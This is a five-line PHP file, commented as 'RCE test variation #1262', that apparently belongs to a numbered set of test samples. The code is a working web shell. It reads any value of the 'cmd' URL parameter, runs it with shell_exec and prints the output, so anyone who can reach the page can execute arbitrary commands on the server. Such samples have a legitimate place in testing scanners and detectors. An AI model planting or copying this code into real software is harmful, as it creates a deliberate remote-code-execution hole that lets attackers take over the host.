<?php
// RCE test variation #1262
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>